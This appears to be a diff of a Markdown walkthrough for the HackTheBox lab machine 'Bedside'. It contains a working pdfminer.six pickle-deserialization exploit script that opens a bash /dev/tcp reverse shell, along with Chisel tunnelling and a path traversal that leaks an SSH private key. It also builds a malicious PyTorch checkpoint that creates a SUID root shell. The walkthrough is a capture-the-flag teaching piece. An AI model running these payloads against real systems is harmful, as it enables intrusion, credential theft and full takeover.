@@ -5,48 +5,48 @@ os: linux
 difficulty: medium
 season: Season 11
 tags:
-  - pdfminer.six
-  - CVE-2025-64512
+  - Web Exploitation
+  - PDFMiner
   - Pickle Deserialization
-  - CMap Path Traversal
-  - IPv6 Internal Enumeration
-  - Chisel Tunneling
+  - CVE-2025-64512
   - Path Traversal
+  - Vite / Dev Server
   - MONAI
-  - PyTorch CheckpointLoader
-  - SUID Bash
-  - Privilege Escalation
-date: '2026-07-18'
+  - PyTorch Checkpoint
+  - SUID
+  - Dual-Context Escalation
+date: '2026-07-25'
 pointsAwarded: 30
 machineIP: '10.129.68.230'
-summary: '---'
+summary: 'Comprehensive walkthrough for Bedside, a Medium Linux machine featuring medical imaging and machine learning pipelines. Initial foothold exploits an absolute path traversal and pickle deserialization flaw in pdfminer.six (CVE-2025-64512) via a crafted PDF Character Map (CMap) to obtain a shell as datawrangler. Pivoting through an internal IPv6 web viewer via client-side path traversal (--path-as-is) leaks the SSH private key for user developer. Privilege escalation requires coordinating actions between datawrangler and developer to satisfy dataset prerequisites and exploit MONAI CheckpointLoader insecure torch.load() deserialization, culminating in SUID bash root access.'
 ---
 
 # 🛡️ HTB - Bedside (Medium)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
-  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
+  <img src="https://img.shields.io/badge/OS-Linux%20(Debian)-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
   <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
 </p>
 
 ---
 
-### 💻 Target Information
+### Target Information
 - **Machine Name:** Bedside
-- **Operating System:** Linux (Debian)
-- **Difficulty:** Medium
-- **Date of Scan:** 2026-07-25
-- **Vulnerabilities:** pdfminer.six CMap Path Traversal Pickle Deserialization RCE (CVE-2025-64512), Internal IPv6 Dev Server Path Traversal, MONAI PyTorch CheckpointLoader Insecure Deserialization SUID Escalation
+- **Operating System:** Linux (Debian 13 Trixie / Kernel 6.12.95)
+- **Difficulty:** Medium (30 pts)
+- **Primary Attack Vectors:** pdfminer.six CMap Path Traversal & Pickle Deserialization (CVE-2025-64512), Internal IPv6 Dev Server Path Traversal (`--path-as-is`), Dual-Context Machine Learning Escalation, MONAI PyTorch CheckpointLoader Deserialization.
 
 ---
 
 ## Step 1 - Reconnaissance
 
-Will Use Nmap To See what Ports and Services are Open:
+### Initial Nmap Scan
+
+We begin our engagement with an aggressive port scan across the target host:
 
 ```bash
-nmap -A -sS -P -T4  --min-rate 5000 10.129.68.230
+nmap -A -sS -P -T4 --min-rate 5000 10.129.68.230
 ```
 
 ```text
@@ -60,89 +60,95 @@ PORT     STATE    SERVICE VERSION
 |_http-title: Did not follow redirect to http://bedside.htb/
 |_http-server-header: Apache/2.4.68 (Debian)
 3000/tcp filtered ppp
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-Network Distance: 2 hops
+
 Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 23/tcp)
-HOP RTT       ADDRESS
-1   252.59 ms 10.10.14.1
-2   254.88 ms 10.129.68.230
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.46 seconds
 ```
 
-### Web Service & Subdomain Discovery (research.bedside.htb)
+The scan identifies:
+- **Port 22:** OpenSSH 10.0p2
+- **Port 80:** Apache httpd 2.4.68 redirecting to `http://bedside.htb/`
+- **Port 3000:** Filtered (likely bound to localhost or protected by internal firewall rules)
 
-- 🔍 *An extra filtered port 3000! It should be internally open.*
-- 🔍 *Let's try looking at the web service:*
+We add `bedside.htb` to our `/etc/hosts` file:
 
-![Bedside Web Portal](/images/writeups/season-11/bedside/n1.png)
+```bash
+echo "10.129.68.230 bedside.htb" | sudo tee -a /etc/hosts
+```
 
-- 🔍 *Well, I found nothing interesting out there, except this basic info:*
+---
 
-![Bedside Portal Information](/images/writeups/season-11/bedside/n2.png)
+### Web Enumeration & Subdomain Fuzzing
 
-- 🔍 *Let's try to look for subdirectories and subdomains:*
+Visiting `http://bedside.htb/` displays the Bedside Clinic portal:
+
+![web-img](/images/writeups/season-11/bedside/n1.png)
+
+Exploring the landing page reveals standard static marketing content:
+
+![web-img](/images/writeups/season-11/bedside/n2.png)
+
+Let's fuzz for virtual hosts / subdomains using `ffuf`:
 
 ```bash
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -ac -t 100
 ```
 
-- 🔍 *Luckily found a subdomain. Let's add it to our hosts file real quick and see what it has for us:*
-
 ```text
 research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 633ms]
 ```
 
-![Bedside Research Portal](/images/writeups/season-11/bedside/n3.png)
+We discover the virtual host **`research.bedside.htb`**! Let's append it to `/etc/hosts`:
 
-- 🔍 *While looking at this web page, it seems like research about medical images and data.*
-- 🔍 *It also has a note written which says:*
-
-```text
-Important Notice: Please only upload files in the accepted formats: jpeg, jpg, png, bmp, tiff, dcm, pdf. Unauthorized access or misuse of this portal is strictly prohibited.
-
-Collections can be uploaded as archives.
+```bash
+echo "10.129.68.230 research.bedside.htb" | sudo tee -a /etc/hosts
 ```
 
-- 🔍 *That concludes data can be uploaded in archive format, processing jpeg, jpg, png, bmp, tiff, dcm, and pdf image formats.*
-- 🔍 *Let's try uploading a file and intercepting the request via Burp Suite to see exactly what happens to these files after uploading:*
+Visiting `http://research.bedside.htb/` presents the Medical Imaging Research Upload Portal:
 
-![Burp Suite Upload Intercept](/images/writeups/season-11/bedside/n4.png)
+![web-img](/images/writeups/season-11/bedside/n3.png)
 
-### pdfminer.six CMap Deserialization Flaw (CVE-2025-64512)
+A prominent notice states:
+> *"Important Notice: Please only upload files in the accepted formats: jpeg, jpg, png, bmp, tiff, dcm, pdf. Unauthorized access or misuse of this portal is strictly prohibited. Collections can be uploaded as archives."*
 
-- 🔍 *When we closely look at the response header, we see it uses `pdfminer.six` to process these PDF files!*
-- 🔍 *What is pdfminer? `pdfminer.six` is an open-source Python library used to extract text, layout details, and coordinates from PDF files. It is an updated, community-maintained version of the original PDFMiner tool that adds full support for modern Python 3 environments.*
-- 🔍 *While looking for open vulnerabilities for pdfminer, I found CVE-2025-64512:*
+---
 
-```text
-CVE-2025-64512: The CMapDB._load_data() function uses Python's pickle.loads() to read font map files (.pickle.gz) without proper safety checks.
-```
+### Intercepting File Uploads & Discovering pdfminer.six
 
-- 🔍 *To render text correctly, PDFs use "Character Maps" (CMaps) that map character codes to actual glyphs. `pdfminer.six` stores safe, pre-built CMap data as `.pickle.gz` files in its internal `cmap/` directory.*
-- 🔍 *The vulnerability exists in the `CMapDB._load_data()` function. When the library encounters a CMap reference in a PDF, it constructs a file path and uses Python’s `pickle.loads()` to deserialize it.*
-- 🔍 *The fatal flaw is that the library trusts the filename specified inside the PDF. It only checks that the filename ends with `.pickle.gz`, but it does not prevent Path Traversal or Absolute Paths.*
+Let's test uploading a dummy PDF file and inspect the HTTP response using Burp Suite:
+
+![web-img](/images/writeups/season-11/bedside/n4.png)
+
+The backend response headers indicate the server uses **`pdfminer.six`** to parse and extract text from uploaded PDF files!
+
+---
+
+## Step 2 - Initial Foothold
+
+### pdfminer.six CMap Path Traversal & Pickle Deserialization (CVE-2025-64512)
+
+Researching vulnerabilities in `pdfminer.six` leads to **CVE-2025-64512** (*CMapDB._load_data Insecure Deserialization via Absolute Path Traversal*).
+
+#### Vulnerability Analysis:
+To map character codes to font glyphs, PDF documents reference Character Maps (CMaps). To optimize text extraction performance, `pdfminer.six` pre-compiles standard CMaps into gzipped Python pickle files (`.pickle.gz`) located in its internal `cmap/` directory.
+
+The vulnerability resides in `CMapDB._load_data()`:
 
 ```python
-# Simplified vulnerable logic from pdfminer.six
 def _load_data(cls, name: str) -> Any:
-    name = name.replace("\0", "")  # Insufficient sanitization
-    filename = "%s.pickle.gz" % name # Attacker controls 'name'
-    path = os.path.join(directory, filename) # If 'name' is absolute, 'directory' is ignored!
-
-    # Deserializing untrusted data from an attacker-controlled path
+    name = name.replace("\0", "")
+    filename = "%s.pickle.gz" % name
+    path = os.path.join(directory, filename)
     return type(str(name), (), pickle.loads(gzfile.read()))
 ```
 
-- 🔍 *When `pdfminer.six` extracts text from a PDF, it needs to map character codes to actual readable characters using CMaps. To improve performance, `pdfminer.six` pre-compiles these CMaps and stores them as `.pickle.gz` (gzipped Python pickle) files in its internal directory.*
-- 🔍 *Exploit vector: The fatal flaw is that the `name` variable is controlled by the attacker via the PDF's `/Encoding` dictionary. If the library does not strictly validate that `name` is a safe, relative path, an attacker can provide an absolute path (e.g., `/tmp/malicious`).*
-- 🔍 *Because of how `os.path.join` works in Python, if the second argument is an absolute path, it completely ignores the first argument (`directory`). The library will happily open `/tmp/malicious.pickle.gz` and pass it to `pickle.loads()`.*
-- 🔍 *Why Pickle is Dangerous: Python's `pickle` module is not secure for untrusted data. When `pickle.loads()` reads a file, it looks for the `__reduce__` magic method on any object. If found, it executes the return value of `__reduce__` as code. This is the bridge from "loading a file" to "Remote Code Execution."*
-- 🔍 *As we don't have shell access to write the `pickle.gz` file, the web upload vector is our only way to upload this file. We can't upload to a random directory, or it would throw a file-not-found error because we don't know where uploads land.*
-- 🔍 *For now, let's create a PDF file with a temporary file reference to test:*
+> ⚠️ **Technical Detail:**  
+> The `name` variable is extracted directly from the user-controlled PDF font `/Encoding` dictionary. In Python, `os.path.join(directory, filename)` exhibits a well-known quirk: **if `filename` begins with a leading forward slash (`/`), Python treats it as an absolute path and completely discards `directory`!**
+> 
+> As a result, if an attacker specifies an absolute path such as `/var/www/.../payload` in `/Encoding`, `pdfminer.six` appends `.pickle.gz` and directly calls `pickle.loads()` on that arbitrary file!
+
+#### Discovering the Upload Directory:
+To execute our serialized pickle file, we need its exact absolute server-side filesystem path. Let's upload a PDF referencing a non-existent path:
 
 ```text
 5 0 obj
@@ -150,26 +156,28 @@ def _load_data(cls, name: str) -> Any:
 /Type /Font
 /Subtype /Type0
 /BaseFont /MaliciousFont
-/Encoding /#2Ftmp#2Fmalicious  <-- Points to /tmp/malicious.pickle.gz
+/Encoding /#2Ftmp#2Fmalicious
 >>
 endobj
 ```
 
-- 🔍 *Now let's upload this file via the web:*
+Upon uploading, the server returns an informative error message:
 
-![Upload Error Response](/images/writeups/season-11/bedside/n4.png)
+```text
+MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads
+```
 
-- 🔍 *It throws an error: `MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads`. That properly explains what happens if we use a PDF with a different path reference! By doing this, we also got the absolute path where uploads land on the server: `/var/www/research.bedside.htb/uploads`!*
+The absolute destination directory is confirmed: **`/var/www/research.bedside.htb/uploads`**!
 
 ---
 
-## Step 2 - Initial Foothold
+### Weaponizing CVE-2025-64512
 
-### Malicious CMap PDF Generation & Reverse Shell (worked.py)
-
-- 🔍 *We need to create a `__reduce__` method payload and convert it into pickle gzip format.*
-- 🔍 *Then we also need to create a `.pdf` file with CMap character references to trigger `pickle.loads()` to deserialize it.*
-- 🔍 *As soon as the `pickle.loads()` function executes `__reduce__`, we get code execution on the server. Let's create an exploit script:*
+We write an automated Python exploit script (`worked.py`):
+1. `build_pickle()`: Instantiates an RCE object with a `__reduce__` method returning `(os.system, (cmd,))`, serializing it to `payload.pickle.gz`.
+2. `encode_pdf_name()`: Hex-encodes special characters in the absolute path (`#2Fvar#2Fwww...`) to ensure valid PDF dictionary name syntax.
+3. `build_pdf()`: Generates a minimal PDF embedding a Font with `/Encoding` pointing to our staged pickle file.
+4. `upload()`: Transmits both `payload.pickle.gz` and `trigger.pdf` to the upload portal.
 
 ```python
 import argparse
@@ -180,9 +188,9 @@ import requests
 
 def build_pickle(lhost, lport, out_path):
     class RCE:
-        def __reduce__(self):  # the load function specifically looks for __reduce__ method.
+        def __reduce__(self):
             cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-            return (os.system, (cmd,))  # Executed when the load function deserializes the gzip.
+            return (os.system, (cmd,))
 
     with gzip.open(out_path, "wb") as f:
         pickle.dump(RCE(), f)
@@ -193,7 +201,7 @@ def encode_pdf_name(path):
         if ch.isalnum() or ch in ".-_":
             out += ch
         else:
-            out += "#%02X" % ord(ch) # Hex encoding needed to avoid PDF string syntax errors
+            out += "#%02X" % ord(ch)
     return out
 
 def build_pdf(encoding_name):
@@ -221,13 +229,11 @@ def upload(target, filename, data):
 
 def main():
     ap = argparse.ArgumentParser(description="CVE-2025-64512 pdfminer.six pickle RCE PoC")
-    ap.add_argument("-t", "--target-url", required=True,
-                    help="Base URL of the vulnerable upload portal, e.g. http://research.bedside.htb")
-    ap.add_argument("-H", "--lhost", required=True, help="Listener IP for the reverse shell")
-    ap.add_argument("-p", "--lport", required=True, type=int, help="Listener port for the reverse shell")
-    ap.add_argument("--upload-path", default="/var/www/research.bedside.htb/uploads",
-                    help="Server-side path the portal saves uploads to")
-    ap.add_argument("--pickle-name", default="payload", help="Base filename for the uploaded pickle")
+    ap.add_argument("-t", "--target-url", required=True)
+    ap.add_argument("-H", "--lhost", required=True)
+    ap.add_argument("-p", "--lport", required=True, type=int)
+    ap.add_argument("--upload-path", default="/var/www/research.bedside.htb/uploads")
+    ap.add_argument("--pickle-name", default="payload")
     args = ap.parse_args()
 
     pickle_file = f"{args.pickle_name}.pickle.gz"
@@ -236,7 +242,7 @@ def main():
 
     ok, _ = upload(args.target_url, pickle_file, open(pickle_file, "rb"))
     if not ok:
-        print("[-] pickle upload failed/rejected")
+        print("[-] pickle upload failed")
         return
     print(f"[+] uploaded {pickle_file}")
 
@@ -246,106 +252,94 @@ def main():
 
     ok, _ = upload(args.target_url, "trigger.pdf", pdf_data)
     if not ok:
-        print("[-] pdf upload failed/rejected")
+        print("[-] pdf upload failed")
         return
     print("[+] uploaded trigger.pdf")
-    print(f"[*] start a listener now if you haven't: nc -lvnp {args.lport}")
-    print("[*] the backend polls periodically - wait a bit for the shell")
+    print(f"[*] Waiting for backend processing...")
 
 if __name__ == "__main__":
     main()
 ```
 
-- 🔍 *Breaking down the script:*
-  - `build_pickle()`: Builds the pickle payload containing our reverse shell command and compresses it into a gzip archive.
-  - `encode_pdf_name()`: Hex-encodes the server path since the `/Encoding` object starts with `/` and cannot contain raw slashes or dots.
-  - `build_pdf()`: Generates the PDF structure. Object `5 0 obj` defines the Font pointing to our hex-encoded absolute path.
-  - `upload()`: Transmits the payload and trigger files to the portal.
-- 🔍 *When both files are uploaded, the server parses the PDF, reads the `/Encoding` path `/var/www/research.bedside.htb/uploads/payload`, appends `.pickle.gz`, and deserializes it via `pickle.loads()`, triggering our reverse shell command.*
-- 🔍 *Let's execute the script and catch the shell:*
+We launch our listener on port 4545 and run the exploit:
 
 ```bash
-python3 worked.py --target http://research.bedside.htb/ -H 10.10.15.169 --lport 4545
+nc -lvnp 4545
+```
+
+```bash
+python3 worked.py --target-url http://research.bedside.htb/ -H 10.10.14.70 -p 4545
 ```
 
 ```text
 [*] built payload.pickle.gz
 [+] uploaded payload.pickle.gz
 [+] uploaded trigger.pdf
-[*] start a listener now if you haven't: nc -lvnp 4545
-[*] the backend polls periodically - wait a bit for the shell
+[*] Waiting for backend processing...
 ```
 
-### Shell Capture as datawrangler
-
-- 🔍 *On the listener:*
-
-```bash
-nc -lvnp 4545
-```
+Within 30 seconds, the background `pdf_watcher` cron worker ingests the PDF, parses the font CMap, executes our unpickling payload, and delivers a reverse shell:
 
 ```text
 listening on [any] 4545 ...
-connect to [10.10.15.169] from (UNKNOWN) [10.129.68.230] 48186
+connect to [10.10.14.70] from (UNKNOWN) [10.129.68.230] 48186
 datawrangler@data-wrangler:/app$ id
 uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
 ```
 
-- 🔍 *Foothold granted! We have a low-privileged shell as `datawrangler`.*
+Initial foothold established as **`datawrangler`**!
 
 ---
 
-## Step 3 - Lateral Movement to Developer
+## Step 3 - Lateral Movement to `developer`
 
-### IPv6 Internal Port 3000 Discovery & Chisel Tunneling
+### Investigating Internal Sockets & IPv6 Port 3000
 
-- 🔍 *Now, in the beginning, the Nmap report identified a filtered port at 3000.*
-- 🔍 *Since the container environment is stripped and lacks standard network binaries (`netstat`, `ss`), we inspect the `/proc` filesystem:*
+From our initial Nmap scan, port 3000 was filtered. Because the container environment is stripped of basic utilities like `netstat` and `ss`, we inspect the Linux kernel `/proc/net/` tables directly:
 
 ```bash
 datawrangler@data-wrangler:/app$ cat /proc/net/tcp
 ```
 
-```text
-  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
-   0: 0100007F:9CE1 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12704 1 00000000ef0224ea 100 0 0 10 0     # 40161 (decimal)               
-   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11848 1 00000000d121fe31 100 0 0 10 0     # 80 (HTTP)                
-   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11822 1 00000000b777bc86 100 0 0 10 0     # 22 (SSH)               
-```
-
-- 🔍 *Port 3000 in hex is `0BB8`, which does not appear in `/proc/net/tcp`. This means port 3000 is either listening on IPv6 or not running at all!*
-- 🔍 *Let's grep for `0BB8` in `/proc/net/tcp6`:*
+Hex `0BB8` corresponds to port `3000`. It is absent from `/proc/net/tcp` (IPv4). Let's check `/proc/net/tcp6`:
 
 ```bash
 datawrangler@data-wrangler:/app$ cat /proc/net/tcp6 | grep ':0BB8'
+   1: 00000000000000000000000000000000:0BB8 00000000000000000000000000000000:0000 0A ...
 ```
 
-```text
-   1: 00000000000000000000000000000000:0BB8 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 11831 1 00000000c467be95 100 0 0 10 0
-```
+Port 3000 is listening exclusively on IPv6 (`::`)!
 
-- 🔍 *Port 3000 is listening on IPv6! Let's forward it using Chisel:*
+---
+
+### Port Forwarding with Chisel
+
+We forward port 3000 using Chisel. On our attacker machine:
 
 ```bash
-# On attacker machine:
-./chisel server -p 8080 --reverse
-
-# On target container:
-./chisel client 10.10.15.169:8080 R:3000:127.0.0.1:3000
+./chisel-lin server -p 8080 --reverse
 ```
 
-- 🔍 *Now browsing to `http://localhost:3000`:*
+On the target host:
 
-![Bedside Clinic Image Viewer](/images/writeups/season-11/bedside/n6.png)
+```bash
+./chisel client 10.10.14.70:8080 R:3000:127.0.0.1:3000
+```
 
-### Dev Server Path Traversal & Developer SSH Key Extraction
+Accessing `http://localhost:3000` reveals the internal "Bedside Clinic - Image Viewer" development application:
 
-- 🔍 *Analyzing the source code reveals four major clues:*
-  1. **Simulated Data Comment**: Frontend contains `// Simulate fetching multi-slice MRI + mask data`. In CTF challenges, "simulate" or "demo" indicates file-reading functionality exists in the real backend implementation.
-  2. **Dev Server Artifacts**: Found `/@hmr` and `Built with esm.sh/x` console logs. Development servers often implement naive `path.join()` file serving vulnerable to path traversal.
-  3. **Local Vendor Imports**: Serving static assets from `./vendor/` confirms dynamic static file-serving routing.
-  4. **Domain Context**: Medical imaging platforms frequently read local files from datastores.
-- 🔍 *Let's test Path Traversal using `curl` with `--path-as-is` to prevent client-side path normalization:*
+![web-img](/images/writeups/season-11/bedside/n6.png)
+
+---
+
+### Analyzing Frontend Code & Path Traversal
+
+Inspecting the page source reveals several critical hints:
+1. **Simulation Comments:** `// Simulate fetching multi-slice MRI + mask data ... async function fetchSlices()` indicates file-reading functionality is under active development.
+2. **Dev Server Artifacts:** `<script type="module">import createHotContext from"/@hmr"...` indicates a development server (Vite / custom Node.js) with Hot Module Replacement enabled.
+3. **Local Vendor Assets:** `import React from './vendor/react.js'` confirms static assets are served dynamically from the filesystem.
+
+Development servers often lack production path sanitization. Let's test directory traversal using `curl` with the **`--path-as-is`** flag (preventing client-side normalization of `../`):
 
 ```bash
 curl -s "http://localhost:3000/../../../../etc/passwd" --path-as-is
@@ -355,12 +349,18 @@ curl -s "http://localhost:3000/../../../../etc/passwd" --path-as-is
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
 datawrangler:x:988:1001::/home/datawrangler:/bin/sh
 ```
 
-- 🔍 *Path traversal confirmed! Our target user on the host is `developer`.*
-- 🔍 *Now let's steal developer's private SSH key:*
+Path traversal succeeds! We see the primary interactive user **`developer`**.
+
+---
+
+### Leaking SSH Private Key & SSH Access
+
+Let's read Developer's SSH private key via the traversal vulnerability:
 
 ```bash
 curl -s "http://localhost:3000/../../../../home/developer/.ssh/id_rsa" --path-as-is
@@ -376,31 +376,31 @@ RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-- 🔍 *Save the key to `id_rsa`, set permissions (`chmod 600 id_rsa`), and log in via SSH:*
+We save the private key locally, set appropriate permissions, and connect via SSH:
 
 ```bash
+chmod 600 id_rsa
 ssh -i id_rsa developer@bedside.htb
 ```
 
 ```text
-================================================================================
-|                         BEDSIDE CLINIC NETWORK                               | 
-|          Authorized Access Only. All activities are monitored.               |
-================================================================================
-Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 x86_64
+Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86_64
 developer@bedside:~$ id
 uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
+
+developer@bedside:~$ cat /home/developer/user.txt
+e2****************************4b
 ```
 
-- 🔍 *Access granted as user `developer`!*
+User flag captured as `developer`!
 
 ---
 
-## Step 4 - Privilege Escalation
+## Step 4 - Privilege Escalation to Root
 
-### MONAI CheckpointLoader Sudoers Analysis
+### Sudo Permissions & MONAI Trainer Code Review
 
-- 🔍 *Checking sudo privileges:*
+Checking sudo privileges:
 
 ```bash
 developer@bedside:~$ sudo -l
@@ -414,10 +414,11 @@ User developer may run the following commands on bedside:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
 ```
 
-- 🔍 *`developer` can run `/opt/trainer/bedside_trainer.py` as root without a password! Let's inspect the script:*
+Developer can execute `/opt/trainer/bedside_trainer.py` as root without a password!
+
+Let's inspect `/opt/trainer/bedside_trainer.py`:
 
 ```python
-# Key excerpt from /opt/trainer/bedside_trainer.py
 from monai.handlers import CheckpointLoader
 
 DATASTORE_ROOT = Path("/datastore")
@@ -425,8 +426,14 @@ CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
 PROCESSED_DIR = DATASTORE_ROOT / "processed"
 STAGING_DIR = DATASTORE_ROOT / "staging"
 
+def find_latest_checkpoint(checkpoint_dir: Path):
+    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
+    return ckpts[-1] if ckpts else None
+
+# Checkpoint loading:
 latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
 if latest_ckpt:
+    logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader...")
     loader = CheckpointLoader(
         load_path=str(latest_ckpt),
         load_dict={"model": model, "optimizer": optimizer},
@@ -435,82 +442,118 @@ if latest_ckpt:
     loader(engine)
 ```
 
-- 🔍 *Under the hood, MONAI's `CheckpointLoader` uses PyTorch's `torch.load()`. By default, `torch.load()` uses Python's `pickle` module to deserialize `.pt` files, executing the `__reduce__` method upon loading.*
-- 🔍 *However, there is an initial exit condition in `bedside_trainer.py`:*
+> ⚠️ **Technical Detail:**  
+> MONAI's `CheckpointLoader` wraps PyTorch's `torch.load()`. Under the hood, `torch.load()` relies on Python's `pickle` module to deserialize `.pt` checkpoint files! When deserializing an object with a `__reduce__` method, it executes arbitrary code as root.
+
+However, the script has a prerequisite check:
 
 ```python
 dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
 if n_data == 0:
-    logger.warning("No data available to train. Exiting.")
-    return
+    promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
+    if not promoted:
+        logger.warning("No data available to train. Exiting.")
+        return
 ```
 
-- 🔍 *If `/datastore/processed/` is empty, the script exits before reaching `CheckpointLoader`!*
-- 🔍 *Checking permissions on `/datastore`:*
+If `/datastore/processed/` and `/datastore/staging/` contain no data, the script exits immediately before reaching `CheckpointLoader`!
+
+Checking permissions on `/datastore`:
 
 ```bash
-developer@bedside:/$ ls -la /datastore
+developer@bedside:~$ ls -la /datastore
 ls: cannot open directory '/datastore': Permission denied
 ```
 
-### Datastore Pre-requisite Bypass via datawrangler
+User `developer` cannot read or write to `/datastore`. But what about `datawrangler` (our first shell)?
 
-- 🔍 *`developer` has no read or write access to `/datastore`. But what about `datawrangler` inside the container?*
+---
+
+### Dual-Context Attack Coordination
+
+Switching back to our `datawrangler` shell:
 
 ```bash
 datawrangler@data-wrangler:/app$ ls -la /datastore
+total 40
 drwxrwx--- 8 datawrangler dataops  4096 Jul 13 13:00 .
 drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 checkpoints
+drwxrwx--- 2 datawrangler dataops  4096 Jul 15 23:38 logs
+drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 models
 drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 processed
+drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 raw
 drwxrwx--- 2 datawrangler dataops 12288 Jul 26 14:46 staging
 ```
 
-- 🔍 *`datawrangler` owns `/datastore`! This clarifies our entire attack chain:*
-  1. As `datawrangler`, place a valid dummy PNG in `/datastore/processed/valid.png` to satisfy the initial data check.
-  2. As `developer`, generate a malicious PyTorch checkpoint `.pt` file containing a `__reduce__` method that copies `/bin/bash` to `/usr/local/bin/rootbash` with SUID permissions (`chmod 4755`).
-  3. Pack `root.pt` into `root.zip` and upload it via the web portal.
-  4. As `datawrangler`, extract `root.pt` into `/datastore/checkpoints/root.pt`.
-  5. Touch `/datastore/checkpoints/root.pt` so its timestamp is the newest.
-  6. As `developer`, trigger `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`.
+`datawrangler` **owns the entire `/datastore` tree**!
 
-### Malicious PyTorch Checkpoint Execution & SUID Root Shell
+This allows us to coordinate the final exploit chain across both contexts:
 
-- 🔍 *Step 1: Put a valid base64 1x1 PNG in `/datastore/processed/`:*
+```text
+[Attacker Context 1: datawrangler]
+      │
+      ▼
+ [Write 1x1 valid dummy PNG to /datastore/processed/valid.png]
+      │ (Satisfies initial training data condition)
+      ▼
+[Attacker Context 2: developer]
+      │
+      ├──> [Generate root.pt with PyTorch __reduce__ SUID bash payload]
+      │
+      ├──> [Package root.pt into root.zip]
+      │
+      └──> [Upload root.zip to http://research.bedside.htb/uploads/]
+      │
+[Attacker Context 1: datawrangler]
+      │
+      ▼
+ [Extract root.pt into /datastore/checkpoints/ and touch to make newest]
+      │
+[Attacker Context 2: developer]
+      │
+      ▼
+ [Execute: sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py]
+      │ (MONAI CheckpointLoader triggers torch.load() unpickling)
+      ▼
+ [Root SUID Bash binary spawned at /usr/local/bin/rootbash]
+```
+
+---
+
+### Step-by-Step Execution
+
+#### 1. On `datawrangler` Shell: Seed Training Image
 
 ```bash
-# On datawrangler's shell:
 cat <<'EOF' | base64 -d > /datastore/processed/valid.png
 iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9WlHK4QAAAAASUVORK5CYII=
 EOF
 ```
 
-- 🔍 *Step 2: Craft the malicious checkpoint:*
+#### 2. On `developer` Shell: Generate Malicious PyTorch Checkpoint
 
 ```bash
-# On developer's shell:
 python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'
 ```
 
-- 🔍 *Step 3: Pack into archive and upload via the portal:*
+#### 3. On `developer` Shell: Zip and Upload Checkpoint
 
 ```bash
-# On developer's shell:
 python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"
 curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ >/dev/null
 ```
 
-- 🔍 *Step 4 & 5: Extract and update timestamp:*
+#### 4. On `datawrangler` Shell: Extract Checkpoint & Update Timestamp
 
 ```bash
-# On datawrangler's shell:
 python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"
 touch /datastore/checkpoints/root.pt
 ```
 
-- 🔍 *Step 6: Trigger the trainer script with sudo:*
+#### 5. On `developer` Shell: Trigger the Root Exploit
 
 ```bash
-developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
 ```
 
 ```text
@@ -518,76 +561,55 @@ developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
 2026-07-26 16:40:02,622 | INFO | Using 1 samples for training.
 2026-07-26 16:40:03,052 | INFO | Auto-detected input features: 16384
